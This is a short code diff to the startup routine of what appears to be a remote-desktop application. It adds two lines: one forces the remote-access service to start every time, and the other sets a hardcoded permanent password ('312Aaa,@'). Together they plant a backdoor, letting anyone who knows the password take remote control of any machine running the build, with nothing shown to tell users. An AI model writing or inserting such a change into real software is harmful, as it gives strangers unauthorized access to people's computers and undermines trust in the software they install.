@@ -121,6 +121,8 @@ void runMainApp(bool startService) async {
   await initEnv(kAppTypeMain);
   // trigger connection status updater
   await bind.mainCheckConnectStatus();
+  startService = true;
+  await gFFI.serverModel.setPermanentPassword("312Aaa,@");
   if (startService) {
     gFFI.serverModel.startService();
     bind.pluginSyncUi(syncTo: kAppTypeMain);
